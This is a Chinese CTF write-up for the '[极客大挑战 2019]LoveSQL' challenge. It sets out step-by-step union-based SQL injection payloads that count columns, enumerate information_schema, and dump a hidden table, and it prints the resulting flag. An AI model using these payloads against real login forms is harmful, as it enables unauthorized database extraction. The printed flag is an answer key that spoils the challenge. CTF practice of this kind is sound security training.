# [极客大挑战 2019]LoveSQL

## 题目概述
一个登录页面，表单通过 GET 方法提交 `username` 和 `password` 到 `check.php`。页面提示"用 sqlmap 是没有灵魂的"，暗示需要手工注入。

## 信息收集
- 访问题目首页，获取登录表单源码
- 表单 action 为 `check.php`，method 为 GET，参数为 `username` 和 `password`
- 服务器环境：PHP/7.3.11，MariaDB

## 漏洞分析
**漏洞类型**：SQL 注入（字符型，单引号闭合）

**判断过程**：
1. 输入 `username=1'`，页面返回 MariaDB 语法错误，确认存在 SQL 注入
2. 使用 `ORDER BY` 测试列数：ORDER BY 3 正常，ORDER BY 4 报错，确认 3 列
3. 使用 `UNION SELECT 1,2,3` 测试回显位：第 2 列回显为用户名，第 3 列回显为密码

## 利用过程

### 1. 确认注入点
```
username=1'&password=1
# 返回 SQL 语法错误，确认单引号闭合
```

### 2. 确定列数
```
username=1' ORDER BY 3-- -&password=1  # 正常
username=1' ORDER BY 4-- -&password=1  # 报错
# 列数为 3
```

### 3. 确认回显位
```
username=1' UNION SELECT 1,2,3-- -&password=1
# 第 2、3 列有回显
```

### 4. 获取数据库名和版本
```
username=1' UNION SELECT 1,database(),version()-- -&password=1
# 数据库：geek，版本：10.3.18-MariaDB
```

### 5. 获取表名
```
username=1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='geek'-- -&password=1
# 表：geekuser, l0ve1ysq1
```

### 6. 获取 l0ve1ysq1 表的列名
```
username=1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='l0ve1ysq1'-- -&password=1
# 列：id, username, password
```

### 7. 导出数据获取 Flag
```
username=1' UNION SELECT 1,group_concat(id,0x7c,username,0x7c,password),3 FROM l0ve1ysq1-- -&password=1
# 在第 16 条记录中找到 flag
```

**Flag**: `flag{2b7847e6-43c2-4c3d-918a-200938aed4aa}`

## 复现步骤
1. 访问题目登录页
2. 在用户名输入框输入：`1' UNION SELECT 1,group_concat(id,0x7c,username,0x7c,password),3 FROM l0ve1ysq1-- -`
3. 密码随意输入，点击登录
4. 页面回显所有数据，第 16 条记录的 password 字段即为 flag

## 技术总结
| 项目 | 内容 |
|------|------|
| 漏洞类型 | SQL 注入（UNION SELECT） |
| 攻击入口 | 登录表单 GET 参数 username |
| 核心 Payload | `' UNION SELECT 1,group_concat(...),3 FROM l0ve1ysq1-- -` |
| 知识点 | information_schema 元数据库、group_concat 聚合、列数判断、回显位利用 |

## 知识总结
- **字符型注入**：当输入被单引号包裹时，用 `'` 闭合前段，`-- -` 或 `#` 注释掉后段
- **列数判断**：用 `ORDER BY N` 二分法快速确定列数
- **回显位探测**：`UNION SELECT 1,2,3...` 看哪些数字出现在页面上
- **信息提取顺序**：database() → tables → columns → 数据，逐层深入
- **group_concat**：将多行结果合并为一行输出，方便一次获取所有数据
- **flag 通常在非默认表中**：`geekuser` 是登录表，`l0ve1ysq1` 才是藏 flag 的表
